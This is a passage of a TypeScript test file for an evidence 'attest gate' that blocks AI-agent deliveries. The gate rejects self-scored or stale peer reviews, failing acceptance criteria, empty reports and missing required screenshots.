    const wt = withReport("FIX-SCORE-OWN", 2000);
    const builderSession = "c-score-own:build:claude:1700000000";
    // Same agent+model is FINE — what's rejected is the SAME SESSION (a sub-agent
    // spawned inside the builder's session shares its context). The note records
    // a session-id IDENTICAL to the builder's → rejected as self-scoring.
    withPeerScore(wt, "FIX-SCORE-OWN", 8, "good", "c-score-own", "claude", builderSession);
    const { events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-OWN", "c-score-own", "hard", 1000, s, wt, builderSession);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toMatch(/missing peer review score/i);
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("FIX-343 (B-decision): a pair note with NO session-id is NOT honored (independence unverifiable)", () => {
    const wt = withReport("FIX-SCORE-NOSESS", 2000);
    // A pair note that omits session-id cannot prove an independent fresh session.
    const dir = join(wt, ".roll", "features", "uncategorized", "FIX-SCORE-NOSESS", "notes");
    mkdirSync(dir, { recursive: true });
    writeFileSync(
      join(dir, "2026-06-08-roll-build-FIX-SCORE-NOSESS-8.md"),
      ["---", "skill: roll-build", "story: FIX-SCORE-NOSESS", "score: 8", "verdict: good", "ts: 2026-06-08T12:00:00Z", "scoring: pair", "scored-by: pi", "---", "", "no session id"].join("\n"),
    );
    const { s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-NOSESS", "c-score-nosess", "hard", 1000, s, wt, "c-score-nosess:build:claude:1700000000");
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toMatch(/missing peer review score/i);
  });

  it("FIX-343 (B-decision): SINGLE-VENDOR install no longer deadlocks — claude builder + a claude FRESH-session score → PASS", () => {
    // The exact deadlock case: builder=claude (session A), the score stage spawns
    // a FRESH claude session (session B, same vendor) that writes a scoring:pair
    // note. The OLD vendor-name gate rejected scored-by:claude as "the builder's
    // own" → every default-route delivery hard-failed. The B-decision gate keys
    // on session-id != builderSessionId, so a distinct fresh same-vendor session
    // PASSES.
    const wt = withReport("FIX-SV", 2000);
    const builderSession = "c-sv:build:claude:1700000000";
    withPeerScore(wt, "FIX-SV", 8, "good", "c-sv", "claude", "c-sv:score:claude:a1:1700000099"); // fresh claude session B
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SV", "c-sv", "hard", 1000, s, wt, builderSession);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  // ── FIX-343 (① STRICT cycle-scoped freshness) ───────────────────────────────
  it("FIX-343 (①): a PRIOR-cycle peer note does NOT satisfy THIS cycle's gate (RESUME staleness rejected)", () => {
    // RESUME: an un-merged same-story branch is re-picked by a NEW cycle. A peer
    // score from the PRIOR cycle is on disk; THIS cycle's scorer wrote nothing.
    // The note's session-id starts with the OLD cycle id, so cycle-scope rejects
    // it → the gate fails loud (no soft-pass-by-staleness).
    const wt = withReport("FIX-RESUME", 2000);
    const oldCycle = "c-old-resume";
    const thisCycle = "c-new-resume";
    withPeerScore(wt, "FIX-RESUME", 8, "good", oldCycle, "pi"); // session = c-old-resume:score:pi:a1:...
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-RESUME", thisCycle, "hard", 1000, s, wt, "");
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toMatch(/missing peer review score/i);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("FIX-343 (①): THIS cycle's own peer note (`${cycleId}:score:...`) PASSES (no over-rejection deadlock)", () => {
    // The legitimate fresh score this cycle's scorer minted MUST still pass —
    // session-id starts with THIS cycle's id, so cycle-scope honors it.
    const wt = withReport("FIX-FRESH", 2000);
    const thisCycle = "c-fresh";
    withPeerScore(wt, "FIX-FRESH", 8, "good", thisCycle, "pi"); // session = c-fresh:score:pi:a1:...
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-FRESH", thisCycle, "hard", 1000, s, wt, "");
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("FIX-343: a self/legacy note can NOT shadow a real peer note (filter-peer-then-latest)", () => {
    const wt = withReport("FIX-SCORE-SHADOW", 2000);
    // The peer note is written FIRST; a later self note (alphabetically last)
    // must NOT win — the selector filters to peer THEN picks latest.
    withPeerScore(wt, "FIX-SCORE-SHADOW", 8, "good", "c-score-shadow", "pi");
    const dir = join(wt, ".roll", "features", "uncategorized", "FIX-SCORE-SHADOW", "notes");
    writeFileSync(
      join(dir, `2099-12-31-roll-build-FIX-SCORE-SHADOW-9.md`),
      ["---", "skill: roll-build", "story: FIX-SCORE-SHADOW", "score: 3", "verdict: regression", "ts: 2099-12-31T23:59:59Z", "---", "", "stale self note"].join("\n"),
    );
    const { events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-SHADOW", "c-score-shadow", "hard", 1000, s);
    expect(r.verdict).toBe("produced"); // the peer good/8 stands; the self regression is ignored
    expect(r.blocked).toBe(false);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("US-EVID-013: regression review-score is a hard gate failure", () => {
    const wt = withReport("FIX-SCORE-REG", 2000);
    withPeerScore(wt, "FIX-SCORE-REG", 3, "regression", "c-score-reg");
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-REG", "c-score-reg", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toContain("regression");
    expect(alerts[0]).toContain("review-score");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("US-EVID-013: low ok review-score is skipped with a discrepancy reason", () => {
    const wt = withReport("FIX-SCORE-LOW", 2000);
    withPeerScore(wt, "FIX-SCORE-LOW", 5, "ok", "c-score-low");
    const { alerts, s } = sinks();
    const r = runAttestGate(wt, "FIX-SCORE-LOW", "c-score-low", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(false);
    expect(r.reasons[0]).toMatch(/low review-score.*partial.*Discrepancy/i);
    expect(alerts[0]).toContain("review-score");
  });

  // ── FIX-343 (③ observability): the fail-closed catch must EMIT ──────────────
  it("FIX-343 (③): the fail-closed catch emits an ALERT + an attest:gate event (not silent)", async () => {
    // Force the gate's score read to THROW so the bottom blanket catch runs. Every
    // other block path emits an ALERT + event; before this fix the catch returned
    // a blocked `skipped` verdict SILENTLY → the most safety-critical case (the
    // gate itself errored) was invisible in the audit ndjson. vi.doMock +
    // dynamic import scopes the throwing mock to THIS test only (the rest of the
    // suite uses the real evaluateReviewScoreGate).
    vi.resetModules();
    vi.doMock("../src/lib/review-score.js", async (importOriginal) => {
      const actual = await importOriginal<typeof import("../src/lib/review-score.js")>();
      return {
        ...actual,
        evaluateReviewScoreGate: () => {
          throw new Error("synthetic gate error to exercise the fail-closed catch");
        },
      };
    });
    const { runAttestGate: gateWithThrow } = await import("../src/runner/attest-gate.js");
    const wt = withReport("FIX-CATCH", 2000); // fresh report + content → reaches the score read
    withPeerScore(wt, "FIX-CATCH", 8, "good", "c-catch");
    const { alerts, events, s } = sinks();
    const r = gateWithThrow(wt, "FIX-CATCH", "c-catch", "hard", 1000, s);
    vi.doUnmock("../src/lib/review-score.js");
    vi.resetModules();
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true); // fail CLOSED in hard mode
    expect(r.reasons[0]).toMatch(/failing closed/i);
    // ③: the catch is no longer silent — it emits like every other block path.
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toContain("failing closed");
    expect(alerts[0]).toContain("BLOCKED");
    expect(events).toHaveLength(1);
    expect(events[0]?.cycleId).toBe("c-catch");
    expect(events[0]?.verdict).toBe("skipped");
    expect(events[0]?.reasons[0]).toMatch(/failing closed/i);
  });

  it("no AC block → exempt, even in hard mode", () => {
    const wt = tmp("no-ac");
    const storyDir = join(wt, ".roll", "features", "uncategorized", "FIX-NOAC");
    mkdirSync(storyDir, { recursive: true });
    writeFileSync(join(storyDir, "spec.md"), "# FIX-NOAC\n\nNo acceptance criteria for this chore.\n");
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-NOAC", "c-noac", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.reasons[0]).toContain("no AC block");
  });

  it("skipped (soft): missing report → ALERT + event, NOT blocked", () => {
    const { alerts, events, s } = sinks();
    const r = runAttestGate(tmp("none"), "FIX-311", "c-2", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toContain("attest gate (soft)");
    expect(alerts[0]).not.toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("skipped (hard): missing report → ALERT + event, BLOCKED", () => {
    const { alerts, events, s } = sinks();
    const r = runAttestGate(tmp("none"), "FIX-312", "c-3", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(alerts[0]).toContain("attest gate (hard)");
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("US-ATTEST-012: a fresh but EMPTY-SHELL report is skipped (存在性≠有内容, FIX-214)", () => {
    const wt = withEmptyShell("FIX-314", 2000); // fresh (≥ start 1000) but zero AC
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-314", "c-5", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toMatch(/empty|content|shell/i);
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("US-EVID-005: a fresh all-claimed report is skipped and hard-blocked", () => {
    const wt = withReport("FIX-315", 2000, "claimed only", claimedAcMap("FIX-315"));
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-315", "c-6", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons.join("\n")).toContain("claimed");
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("stale report in hard mode is still skipped + blocked", () => {
    const wt = withReport("FIX-313", 500); // before cycle start 1000
    const { s, alerts } = sinks();
    const r = runAttestGate(wt, "FIX-313", "c-4", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(alerts).toHaveLength(1);
  });

  // ── FIX-400 (AC4): reason strings carry REAL paths, never literal <epic> ─────
  it("FIX-400 AC4: empty-shell reason contains real epic path, not literal '<epic>' placeholder", () => {
    const wt = withEmptyShell("FIX-400H", 2000);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-400H", "c-fix400", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    // The reason must NOT contain the literal placeholder
    for (const reason of r.reasons) {
      expect(reason).not.toMatch(/<epic>/);
    }
    // The reason must contain a real path with the actual epic name (uncategorized in our fixture)
    const reason = r.reasons.join(" ");
    expect(reason).toMatch(/uncategorized/);
    expect(reason).toMatch(/FIX-400H/);
  });

  it("FIX-400 AC4: no-fresh-report reason also uses real path, not <epic>", () => {
    const wt = tmp("no-report");
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-400I", "c-fix400b", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    for (const reason of r.reasons) {
      expect(reason).not.toMatch(/<epic>/);
    }
    expect(r.reasons.join(" ")).toMatch(/FIX-400I/);
  });

  it("FIX-400 AC4: run-dir empty-shell reason points at the selected run report", () => {
    const [wt, reportPath] = withRunDirReport("FIX-400J", "20260624-110904-79182", 2000);
    const { s } = sinks();
    const r = runAttestGate(wt, "FIX-400J", "c-fix400c", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.reasons.join(" ")).toContain(reportPath);
    expect(r.reasons.join(" ")).not.toMatch(/<epic>/);
  });

  it("FIX-400 follow-up: content-bearing report with missing declared capture is not mislabeled empty-shell", () => {
    const wt = withReport("FIX-400K", 2000, '<div class="ev ev-text">npm test: 124 tests pass</div>');
    writeFileSync(
      join(wt, ".roll", "features", "uncategorized", "FIX-400K", "spec.md"),
      "---\nid: FIX-400K\ndeliverable_url: data/items/example.jsonl\n---\n# FIX-400K\n\n## Acceptance Criteria\n\n- [ ] integration evidence is present\n",
    );
    writeAcMap(wt, "FIX-400K", [
      { ac: "FIX-400K:AC1", status: "pass", evidence: [{ kind: "text", label: "test log", textFile: "evidence/npm-test.txt" }] },
    ]);
    writeEvidenceJson(wt, "FIX-400K", {
      captures: [{ kind: "web", out: "screenshots/web.png", taken: false, skipped: "headless Chromium unavailable" }],
    });
    withPeerScore(wt, "FIX-400K", 8, "good", "c-fix400k");

    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-400K", "c-fix400k", "hard", 1000, s);

    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons.join(" ")).not.toMatch(/empty shell|no AC content|no ac-map/i);
    expect(r.reasons.join(" ")).toMatch(/declared surface|capture|screenshot/i);
    expect(alerts[0]).toContain("visual evidence gate failed");
    expect(events[0]?.verdict).toBe("skipped");
  });

  // ── FIX-295: a red assertion is a regression, never an env exception ─────────

  it("FIX-295 (AC-FIX2/AC-FIX3): a `fail` AC blocks in hard mode — a red check is a regression, not waivable", () => {
    // The FIX-284 shape: AC1-3 pass with evidence, AC4 ran the full suite and
    // went red. The cycle MUST fail — a red check on a cycle branch is a
    // regression (main is always green), never an "environmental" exception.
    const wt = withReport("FIX-RED", 2000, '<figure class="shot"><img src="screenshots/p.png"></figure>');
    withPeerScore(wt, "FIX-RED", 8, "good", "c-red");
    writeAcMap(wt, "FIX-RED", [
      { ac: "FIX-RED:AC1", status: "pass", evidence: [{ kind: "screenshot", href: "screenshots/p.png" }] },
      { ac: "FIX-RED:AC4", status: "fail", evidence: [{ kind: "test-pass", label: "full suite" }] },
    ]);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-RED", "c-red", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons[0]).toContain("FIX-RED:AC4");
    expect(r.reasons[0]).toMatch(/regression|cannot be waived|not an environment/i);
    expect(alerts[0]).toContain("BLOCKED");
    expect(alerts[0]).toMatch(/never waived as environmental|regression/i);
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("FIX-295: a `fail` AC in soft mode is still skipped (recorded), just not blocked", () => {
    const wt = withReport("FIX-RED-SOFT", 2000, '<figure class="shot"><img src="screenshots/p.png"></figure>');
    withPeerScore(wt, "FIX-RED-SOFT", 8, "good", "c-red-soft");
    writeAcMap(wt, "FIX-RED-SOFT", [
      { ac: "FIX-RED-SOFT:AC1", status: "pass", evidence: [{ kind: "screenshot", href: "screenshots/p.png" }] },
      { ac: "FIX-RED-SOFT:AC2", status: "fail", evidence: [] },
    ]);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-RED-SOFT", "c-red-soft", "soft", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(false);
    expect(alerts[0]).not.toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("FIX-295: a `blocked` AC (could-not-execute) is NOT a fail — the gate still produces", () => {
    // `blocked` = "a precondition blocks verification" — the genuine
    // non-execution / infra case. It is NOT a red assertion, so it does not
    // trip the regression floor; the delivery passes the gate as before.
    const wt = withReport("FIX-BLOCKED", 2000, '<figure class="shot"><img src="screenshots/p.png"></figure>');
    withPeerScore(wt, "FIX-BLOCKED", 8, "good", "c-blocked");
    writeAcMap(wt, "FIX-BLOCKED", [
      { ac: "FIX-BLOCKED:AC1", status: "pass", evidence: [{ kind: "screenshot", href: "screenshots/p.png" }] },
      { ac: "FIX-BLOCKED:AC2", status: "blocked", evidence: [] },
    ]);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-BLOCKED", "c-blocked", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });
});


describe("FIX-305 — webCaptureTargetForStory: drive a real screenshot for UI/dossier cards", () => {
  function withSpec(storyId: string, specText: string): string {
    const wt = tmp("web");
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
    return wt;
  }

  it("FIX-321: no override + no declared deliverable_url → null (NEVER the dossier — the hollow fallback is deleted)", () => {
    // The defect: every card's web.png was a shot of its OWN story-dossier page
    // (self-referential, identical, proves nothing). The dossier fallback is gone.
    const wt = withSpec("FIX-WEB", "# FIX-WEB\n\n**AC:**\n- [ ] the web casting page renders\n");
    expect(webCaptureTargetForStory(wt, "FIX-WEB")).toBeNull();
  });

  it("FIX-321: an env/deploy override wins; a blank override does NOT fall back to the dossier", () => {
    const wt = withSpec("FIX-WEB", "# FIX-WEB\n\n**AC:**\n- [ ] renders\n");
    expect(webCaptureTargetForStory(wt, "FIX-WEB", "https://app.test/casting")).toBe("https://app.test/casting");
    expect(webCaptureTargetForStory(wt, "FIX-WEB", "   ")).toBeNull();
  });

  it("FIX-321: a declared deliverable_url is the target — http(s) as-is, relative → file:// under the worktree, `dossier` explicit opt-in", () => {
    const http = withSpec("FIX-A", "---\nid: FIX-A\ndeliverable_url: https://app.test/casting\n---\n# FIX-A\n\n**AC:**\n- [ ] x\n");
    expect(webCaptureTargetForStory(http, "FIX-A")).toBe("https://app.test/casting");
    const rel = withSpec("FIX-B", "---\nid: FIX-B\ndeliverable_url: web/casting.html\n---\n# FIX-B\n\n**AC:**\n- [ ] x\n");
    const t = webCaptureTargetForStory(rel, "FIX-B");
    expect(t).toMatch(/^file:\/\//);
    expect(t).toContain("web/casting.html");
    const dossier = withSpec("FIX-C", "---\nid: FIX-C\ndeliverable_url: dossier\n---\n# FIX-C\n\n**AC:**\n- [ ] x\n");
    expect(webCaptureTargetForStory(dossier, "FIX-C")).toContain("FIX-C/index.html"); // dossier only by explicit opt-in
  });

  it("FIX-321: the screenshot_url alias also works", () => {
    const wt = withSpec("FIX-AL", "---\nid: FIX-AL\nscreenshot_url: https://app.test/x\n---\n# FIX-AL\n\n**AC:**\n- [ ] x\n");
    expect(webCaptureTargetForStory(wt, "FIX-AL")).toBe("https://app.test/x");
  });

  it("FIX-321b: a relative deliverable_url with a #fragment deep-links a tab (split before join, re-appended)", () => {
    const wt = withSpec("FIX-FRAG", "---\nid: FIX-FRAG\ndeliverable_url: ui/casting.html#board\n---\n# FIX-FRAG\n\n**AC:**\n- [ ] x\n");
    const t = webCaptureTargetForStory(wt, "FIX-FRAG");
    expect(t).toMatch(/^file:\/\//);
    expect(t).toContain("/ui/casting.html#board"); // fragment preserved, not encoded into the path
    expect(t).not.toContain("%23"); // the "#" must NOT be percent-encoded into the filename
  });

  it("FIX-309/321: an EXPLICITLY-exempted card owes no web capture → null", () => {
    const wt = withSpec(
      "FIX-MIGRATE",
      "---\nid: FIX-MIGRATE\nscreenshot_exempt: pure data migration, no visible surface\n---\n# FIX-MIGRATE\n\n**AC:**\n- [ ] rows migrate\n",
    );
    expect(webCaptureTargetForStory(wt, "FIX-MIGRATE")).toBeNull();
  });
});

/**
 * FIX-309 — a screenshot is the BASELINE for EVERY story ("能截则截，应截尽截").
 * The requirement is ALWAYS-ON by default; keyword/rule matching may NEVER
 * enable it, only EXEMPT (explicit, recorded). These tests lock the default
 * (no-keyword / FIX-284 shape → required) and both exemption channels, plus the
 * gate enforcement (required-but-uncaptured FAILS; required-with-capture PASSES).
 */
describe("FIX-309 — screenshot baseline: default REQUIRED, rules only EXEMPT", () => {
  function withSpec(storyId: string, specText: string): string {
    const wt = tmp("fix309");
    const dir = join(wt, ".roll", "features", "uncategorized", storyId);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), specText);
    return wt;
  }
  /** Write a spec.md into an existing withReport() worktree (same uncategorized epic). */
  function addSpec(wt: string, storyId: string, specText: string): void {
    writeFileSync(join(wt, ".roll", "features", "uncategorized", storyId, "spec.md"), specText);
  }

  it("AC1: a FIX-284-shape card (NO keywords) is REQUIRED by default — keyword absence does NOT exempt", () => {
    // The exact leak: a clear UI Casting redesign whose spec lacks the literal
    // CLI/web/UI/TUI/截图 keywords. Old code judged "no screenshot needed" and it
    // slipped the iron rule. Now: required by default.
    const wt = withSpec("FIX-284", "# FIX-284 — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] the casting layout is reworked\n");
    expect(storyRequiresScreenshot(wt, "FIX-284")).toBe(true);
    expect(screenshotExemption(wt, "FIX-284").reason).toBeUndefined();
  });

  it("AC1: a card with NO spec at all is still REQUIRED (cannot prove an exemption)", () => {
    const wt = tmp("fix309-nospec");
    expect(storyRequiresScreenshot(wt, "FIX-NOSPEC")).toBe(true);
  });

  it("AC2: an explicit `screenshot_exempt: <reason>` exempts → required=false WITH the recorded reason", () => {
    const wt = withSpec(
      "FIX-DATA",
      "---\nid: FIX-DATA\nscreenshot_exempt: pure data migration; no rendered surface\n---\n# FIX-DATA\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n",
    );
    expect(storyRequiresScreenshot(wt, "FIX-DATA")).toBe(false);
    expect(screenshotExemption(wt, "FIX-DATA").reason).toMatch(/screenshot_exempt \(spec\): pure data migration/);
  });

  it("AC2: a falsy `screenshot_exempt: false` does NOT exempt — still required", () => {
    const wt = withSpec("FIX-FALSY", "---\nid: FIX-FALSY\nscreenshot_exempt: false\n---\n# FIX-FALSY\n\n## Acceptance Criteria\n\n- [ ] x\n");
    expect(storyRequiresScreenshot(wt, "FIX-FALSY")).toBe(true);
  });

  it("AC2: a bare boolean `screenshot_exempt: true` is not a recorded reason — still required", () => {
    const wt = withSpec("FIX-BARE-TRUE", "---\nid: FIX-BARE-TRUE\nscreenshot_exempt: true\n---\n# FIX-BARE-TRUE\n\n## Acceptance Criteria\n\n- [ ] x\n");
    expect(storyRequiresScreenshot(wt, "FIX-BARE-TRUE")).toBe(true);
    expect(screenshotExemption(wt, "FIX-BARE-TRUE").reason).toBeUndefined();
  });

  it("AC2: a deny-listed non-visual epic exempts → required=false WITH the recorded reason; keyword/rule only EXEMPTS", () => {
    const wt = tmp("fix309-deny");
    mkdirSync(join(wt, ".roll"), { recursive: true });
    writeFileSync(join(wt, ".roll", "policy.yaml"), "acceptance:\n  screenshot_exempt_epics:\n    - data-migration\n");
    const dir = join(wt, ".roll", "features", "data-migration", "FIX-MIG");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), "# FIX-MIG\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n");
    expect(storyRequiresScreenshot(wt, "FIX-MIG")).toBe(false);
    expect(screenshotExemption(wt, "FIX-MIG").reason).toMatch(/screenshot_exempt_epics \(policy\).*data-migration/);

    // a card in a NON-exempt epic with the same (no-keyword) spec stays required
    const dir2 = join(wt, ".roll", "features", "acceptance-evidence", "FIX-VIS");
    mkdirSync(dir2, { recursive: true });
    writeFileSync(join(dir2, "spec.md"), "# FIX-VIS\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n");
    expect(storyRequiresScreenshot(wt, "FIX-VIS")).toBe(true);
  });

  it("AC2: inline-list deny form is also honoured", () => {
    const wt = tmp("fix309-inline");
    mkdirSync(join(wt, ".roll"), { recursive: true });
    writeFileSync(join(wt, ".roll", "policy.yaml"), "acceptance:\n  screenshot_exempt_epics: [data-migration, infra-only]\n");
    const dir = join(wt, ".roll", "features", "infra-only", "FIX-INF");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "spec.md"), "# FIX-INF\n\n## Acceptance Criteria\n\n- [ ] x\n");
    expect(storyRequiresScreenshot(wt, "FIX-INF")).toBe(false);
  });

  it("AC4: the gate FAILS a REQUIRED-but-uncaptured story (no screenshot, no honest skip) — hard-blocked", () => {
    // A FIX-284-shape delivery (no keywords) with a content report but NO captured
    // visual evidence and NO machine-skip → not "produced".
    const wt = withReport("FIX-UNCAP", 2000, '<div class="ev ev-text">text proof only</div>', textOnlyAcMap("FIX-UNCAP"));
    addSpec(wt, "FIX-UNCAP", "# FIX-UNCAP — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] the casting layout is reworked\n");
    withPeerScore(wt, "FIX-UNCAP", 8, "good", "c-uncap");
    expect(storyRequiresScreenshot(wt, "FIX-UNCAP")).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-UNCAP")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-UNCAP", "c-uncap", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

  it("AC4: the gate PASSES a REQUIRED story that HAS a real capture", () => {
    // FIX-339 (AC6): a real-capture card must also DECLARE its surface (the
    // must-declare floor); a declared deliverable_url + a real web capture passes.
    const wt = withReport("FIX-CAP", 2000, '<figure class="shot"><img src="screenshots/casting.png"></figure>');
    addSpec(
      wt,
      "FIX-CAP",
      "---\nid: FIX-CAP\ndeliverable_url: https://app.example.test/casting#board\n---\n# FIX-CAP — Casting redesign\n\n## Acceptance Criteria\n\n- [ ] the casting layout is reworked\n",
    );
    withPeerScore(wt, "FIX-CAP", 8, "good", "c-cap");
    writeEvidenceJson(wt, "FIX-CAP", { captures: [{ kind: "web", out: "screenshots/casting.png", taken: true }] });
    expect(storyRequiresScreenshot(wt, "FIX-CAP")).toBe(true);
    expect(verificationReportHasContent(wt, "FIX-CAP")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-CAP", "c-cap", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("AC4: an EXEMPT story PASSES with text-only evidence (no capture owed)", () => {
    const wt = withReport("FIX-EXEMPT", 2000, '<div class="ev ev-text">text proof only</div>', textOnlyAcMap("FIX-EXEMPT"));
    addSpec(
      wt,
      "FIX-EXEMPT",
      "---\nid: FIX-EXEMPT\nscreenshot_exempt: pure data migration; no rendered surface\n---\n# FIX-EXEMPT\n\n## Acceptance Criteria\n\n- [ ] rows migrate\n",
    );
    withPeerScore(wt, "FIX-EXEMPT", 8, "good", "c-exempt");
    expect(storyRequiresScreenshot(wt, "FIX-EXEMPT")).toBe(false);
    expect(verificationReportHasContent(wt, "FIX-EXEMPT")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "FIX-EXEMPT", "c-exempt", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("US-QA-015: refactor_contract evidence_mode passes with tests/grep/CI evidence and no screenshots", () => {
    const wt = withReport("REFACTOR-QA", 2000, '<div class="ev ev-text">tests, grep, CI</div>', textOnlyAcMap("REFACTOR-QA"));
    addSpec(
      wt,
      "REFACTOR-QA",
      [
        "---",
        "id: REFACTOR-QA",
        "evidence_mode: refactor_contract",
        "---",
        "# REFACTOR-QA",
        "",
        "This refactor uses no screenshots because the contract is proven by tests, grep, and CI.",
        "",
        "**Evaluation contract:**",
        "- expected_evidence:",
        "  - kind: test",
        "    target: packages/cli/test/role-taxonomy.test.ts",
        "    proves: AC1",
        "  - kind: diff",
        "    target: grep no old role labels",
        "    proves: AC2",
        "  - kind: ci",
        "    target: main CI",
        "    proves: AC3",
        "",
        "## Acceptance Criteria",
        "- [ ] role taxonomy contract is unchanged except the renamed labels",
      ].join("\n"),
    );
    withPeerScore(wt, "REFACTOR-QA", 8, "good", "c-refactor-qa");

    expect(storyRequiresScreenshot(wt, "REFACTOR-QA")).toBe(false);
    expect(screenshotExemption(wt, "REFACTOR-QA").reason).toContain("evidence_mode (frontmatter): refactor_contract");
    expect(verificationReportHasContent(wt, "REFACTOR-QA")).toBe(true);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "REFACTOR-QA", "c-refactor-qa", "hard", 1000, s);
    expect(r.verdict).toBe("produced");
    expect(r.blocked).toBe(false);
    expect(alerts).toHaveLength(0);
    expect(events[0]?.verdict).toBe("produced");
  });

  it("US-QA-015: visual_ui evidence_mode still requires declared visual proof", () => {
    const wt = withReport("VISUAL-QA", 2000, '<div class="ev ev-text">text proof only</div>', textOnlyAcMap("VISUAL-QA"));
    addSpec(
      wt,
      "VISUAL-QA",
      "---\nid: VISUAL-QA\nevidence_mode: visual_ui\ndeliverable_url: https://app.test/page\n---\n# VISUAL-QA\n\n## Acceptance Criteria\n\n- [ ] [visual-evidence] page layout renders\n",
    );
    withPeerScore(wt, "VISUAL-QA", 8, "good", "c-visual-qa");

    expect(storyRequiresScreenshot(wt, "VISUAL-QA")).toBe(true);
    expect(verificationReportHasContent(wt, "VISUAL-QA")).toBe(false);
    const { alerts, events, s } = sinks();
    const r = runAttestGate(wt, "VISUAL-QA", "c-visual-qa", "hard", 1000, s);
    expect(r.verdict).toBe("skipped");
    expect(r.blocked).toBe(true);
    expect(r.reasons.join("\n")).toContain("declared deliverable_url(s) not all really captured");
    expect(alerts[0]).toContain("BLOCKED");
    expect(events[0]?.verdict).toBe("skipped");
  });

